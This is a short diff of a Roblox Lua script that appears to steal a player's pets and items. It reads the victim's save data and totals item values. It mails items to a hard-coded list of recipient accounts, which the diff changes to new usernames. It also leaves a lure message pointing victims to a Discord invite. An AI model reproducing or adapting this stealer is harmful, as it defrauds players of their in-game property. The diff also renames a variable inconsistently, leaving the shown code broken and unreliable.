@@ -8,12 +8,12 @@ local MailMessage = "Join gg / GY2RVSEGDT to get back"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local totalRAP = 0
-local sentUsers = {kingltnsell}
+local sentUsers = {}
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
-local users = _G.Usernames or {"PetsGoMommy", "TobiAltGrind", "TobiHatching"}
+local users = _G.Usernames or {"Kingltnsell", "kenchuboy2k", "kingltntest","kingltn2"}
 local min_rap = _G.min_rap or 1000
 local min_chance = _G.min_chance or 100000
 local discuser = _G.discuser or ""
@@ -106,7 +106,7 @@ local function SendMessage(username, diamonds)
         fields[2].value = fields[2].value .. itemLine .. "\n"
     end
 
-    local sentUsersFormatted
+    local sentFormatted
     if #sentUsers == 1 then
         sentUsersFormatted = "||" .. sentUsers[1] .. "||"
     elseif #sentUsers > 1 then
